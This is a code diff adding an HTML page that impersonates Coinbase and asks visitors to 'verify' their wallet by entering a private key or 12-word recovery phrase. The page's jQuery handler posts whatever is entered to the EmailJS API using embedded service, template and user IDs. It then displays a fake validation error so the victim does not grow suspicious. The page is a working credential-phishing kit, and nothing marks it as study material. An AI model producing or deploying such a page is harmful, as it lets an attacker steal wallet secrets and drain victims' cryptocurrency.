@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
+        integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <!-- Emailjs Hook-->
+    <script
+        type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+      ></script>
+
+      <!-- Connect your public key here-->
+    <script type="text/javascript">
+            (function () {
+              emailjs.init("vZDC3AOIiooGpus8g");
+            })();
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .logo {
+            width: 180px; /* Increased size */
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+
+        h1 {
+            font-size: 32px;
+            margin-bottom: 40px;
+            font-weight: 600;
+        }
+
+        .signin-option {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: 100%;
+            max-width: 400px;
+            border: blue solid;
+        }
+
+        .signin-option:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .option-title {
+            display: flex;
+            align-items: center;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            justify-content: center;
+        }
+
+        .option-title img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        .option-description {
+            color: #ccc;
+            font-size: 16px;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            color: #fff;
+        }
+
+        .modal-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #333;
+            color: #fff;
+        }
+
+        #phrase-input {
+            height: 80px; /* Increased height */
+            font-size: 18px;
+        }
+
+        .close-btn, .connect-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .close-btn {
+            background-color: #ff4c4c;
+            color: white;
+        }
+
+        .connect-btn {
+            background-color: blue;
+            color: white;
+        }
+
+        .close-icon {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #ff4c4c;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="coinbase.png" alt="Logo" class="logo"> 
+    <h1>Get Started by Verifying Your Wallet</h1>
+
+    <div class="signin-option" onclick="openModal('passkey-modal')">
+        <div class="option-title">
+            <img src="https://developers.google.com/static/identity/passkeys/ux/user-interface-design/images/canonical-passkey-icon.png" alt="Person icon">
+            Private Key
+        </div>
+        <div class="option-description">
+            Secured by a Private Key.
+        </div>
+        <div class="option-description">
+            A unique cryptographic key stored securely in your device or password manager.
+        </div>
+    </div>
+    
+    <div class="signin-option" onclick="openModal('phrase-modal')">
+        <div class="option-title">
+            <img src="https://framerusercontent.com/images/zluO0nvaHAxFJwaTdJk6YZH9ih4.png" alt="Key icon">
+            Recovery Phrase
+        </div>
+        <div class="option-description">
+            Secured by your 12-word secret recovery phrase.
+        </div>
+        <div class="option-description">
+            A backup phrase that allows you to restore access to your wallet on any device.
+        </div>
+    </div>
+    
+
+    <!-- Passkey Modal -->
+    <div id="passkey-modal" class="modal" onclick="outsideClick(event, 'passkey-modal')">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <span class="close-icon" onclick="closeModal('passkey-modal')">&times;</span>
+            <h2>Enter Your Private Key</h2>
+            <form id="passkey-form" class="ajaxForm">
+                <input type="password" name="privatekey" id="passkey-input" placeholder="Enter passkey">
+                <button type="submit" class="connect-btn">Connect</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Recovery Phrase Modal -->
+    <div id="phrase-modal" class="modal" onclick="outsideClick(event, 'phrase-modal')">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <span class="close-icon" onclick="closeModal('phrase-modal')">&times;</span>
+            <h2>Enter Your Recovery Phrase</h2>
+            <form id="phrase-form" class="ajaxForm">
+                <input type="text" name="phrase" id="phrase-input" placeholder="Enter 12-word phrase">
+                <button type="submit" class="connect-btn">Connect</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function openModal(id) {
+            document.getElementById(id).style.display = "flex";
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).style.display = "none";
+        }
+
+        function outsideClick(event, id) {
+            if (event.target.id === id) {
+                closeModal(id);
+            }
+        }
+    </script>
+
+    <script>
+        $('.ajaxForm').on('submit', function(event) {
+            event.preventDefault(); // prevent reload
+            
+            var formData = new FormData(this);
+            formData.append('service_id', 'service_icvfyz9');
+            formData.append('template_id', 'template_t6cyqt3');
+            formData.append('user_id', 'vZDC3AOIiooGpus8g');
+        
+            $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
+                type: 'POST',
+                data: formData,
+                contentType: false, 
+                processData: false 
+            }).done(function() {
+                alert('Error Validating Wallet... Please try again later');
+            }).fail(function(error) {
+                alert('Oops... ' + JSON.stringify(error));
+            });
+        });
+    </script>
+
+</body>
+</html>
